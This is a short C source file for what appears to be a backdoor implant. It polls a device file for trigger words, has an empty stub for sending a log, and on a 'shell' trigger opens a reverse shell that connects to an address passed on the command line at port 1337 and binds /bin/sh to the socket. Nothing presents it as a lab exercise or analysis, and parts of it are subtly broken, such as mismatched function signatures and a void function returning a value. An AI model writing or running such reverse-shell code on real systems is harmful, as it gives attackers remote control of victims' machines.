#include <stdio.h>
#include <fcntl.h>
#include <paths.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <sys/socket.h>

#define DEVICE "/dev/cd"
#define LOGFILE "/log.txt"
#define PORT 1337

void sendLog();
void remoteShell();

int main(int argc, char *argv[]) {
    int fd;
    char buf[100];
    while (1) {
        if ((fd = open(DEVICE, O_RDWR)) != -1) {
            read(fd, buf, 100);
            if (strncmp(buf, "key", 3) == 0) {
                if (fork() == 0) {
                    sendLog();
                    exit(0);
                }
            }
            else if (strncmp(buf, "shell", 5) == 0) {
                if (fork() == 0) {
                    remoteShell(argv[1]);
                    exit(0);
                }
            }
            else {
                sleep(1);
            }
        }
        close(fd);
    }
}

void sendLog() {
    
}

void remoteShell(char* addr) {
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(addr);
    sa.sin_port = htons(PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}